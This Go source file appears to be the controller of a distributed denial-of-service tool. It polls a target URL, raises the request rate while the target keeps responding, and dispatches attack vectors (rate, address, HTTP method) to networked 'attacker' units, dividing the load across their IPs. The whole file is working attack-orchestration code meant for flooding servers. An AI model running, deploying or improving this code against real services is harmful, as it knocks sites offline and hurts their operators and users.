package main

import (
	"fmt"
	"gra/m/v2/internal"
	"os"
	"time"

	mapset "github.com/deckarep/golang-set"
	"github.com/pkg/errors"
	"github.com/valyala/fasthttp"
	"github.com/xshkut/roletalk-go"
	"gopkg.in/yaml.v2"
)

const TARGET_RESPONSE_TIME_SEC = 60

func rateProcessor(addrStateCh <-chan addressState, rateCh chan<- float64, peer *roletalk.Peer) {
	var currentRate float64 = 0

	lastTime := time.Now()

	for addrState := range addrStateCh {
		now := time.Now()
		msPassed := now.Sub(lastTime).Seconds()
		lastTime = now

		if !peer.Destination(internal.ATTACKER_ROLE_NAME).Ready() {
			currentRate = 0
		} else {
			if currentRate == 0 {
				currentRate = 1
			}
		}

		currentRate = computeNewRate(addrState.status, addrState.responseTime, currentRate, float64(msPassed))

		rateCh <- currentRate
	}
}

func computeNewRate(status int, responseTime float64, oldRate float64, timeDiff float64) float64 {
	var delta float64

	if status >= 500 {
		delta = 0
	} else if responseTime < TARGET_RESPONSE_TIME_SEC*1000 {
		delta = oldRate * 0.1
	}

	var newRate float64 = oldRate + delta

	return newRate
}

func consumeRate(address string, method string, rateCh <-chan float64, peer *roletalk.Peer, ipMap map[string]mapset.Set) error {
	for rate := range rateCh {
		err := transmitAttackVector(address, method, peer, rate, ipMap)

		if err != nil {
			return errors.Wrap(err, "Cannot transmit attack vector")
		}
	}

	return nil
}

func transmitAttackVector(address string, method string, peer *roletalk.Peer, rate float64, ipMap map[string]mapset.Set) error {
	ipCount := len(ipMap)

	if ipCount == 0 {
		return nil
	}

	for _, unitSet := range ipMap {
		unitCount := unitSet.Cardinality()
		if unitCount == 0 {
			// Despite this should not happen
			continue
		}

		reqRatio := 1.0 / float64(ipCount) / float64(unitCount)

		av := internal.AttackVector{
			Rate:    rate * reqRatio,
			Address: address,
			Method:  method,
		}

		for unit := range unitSet.Iter() {
			u, ok := unit.(*roletalk.Unit)
			if !ok {
				return errors.New("Expected type *Unit in unitSet")
			}

			go peer.Destination(internal.ATTACKER_ROLE_NAME).Send(internal.ATTACK_VECTOR_EVENT, roletalk.EmitOptions{Unit: u, Data: av})
		}
	}

	return nil
}

type addressState struct {
	responseTime float64
	status       int
}

func startCheckingAddress(address string, addrStateCh chan<- addressState) {
	checkAddress(address)

	for {
		addrState, err := checkAddress(address)
		if err != nil {
			logger.Info(errors.Wrap(err, "Cannot check server status"))
			time.Sleep(time.Second * 1)
			continue
		}

		addrStateCh <- addrState

		time.Sleep(time.Second * 1)
	}
}

func checkAddress(address string) (state addressState, err error) {
	startTime := time.Now()

	client := fasthttp.Client{}

	body := make([]byte, 0)

	var status int

	status, _, err = client.Get(body, address)
	if err != nil {
		return
	}

	if status != 200 {
		err = fmt.Errorf("got status %v", status)
		return
	}

	state = addressState{responseTime: float64(time.Since(startTime).Milliseconds()), status: status}

	return state, nil
}

type config struct {
	Targets []internal.AttackVector `yaml:"targets"`
}

func getConfig(filePath string) (avs []internal.AttackVector, err error) {
	var dat []byte

	dat, err = os.ReadFile(filePath)
	if err != nil {
		err = errors.Wrap(err, "cannot read config file")
		return
	}

	cfg := config{}

	err = yaml.Unmarshal(dat, &cfg)
	if err != nil {
		logger.Info("error: %v", err)
	}

	avs = cfg.Targets

	return
}
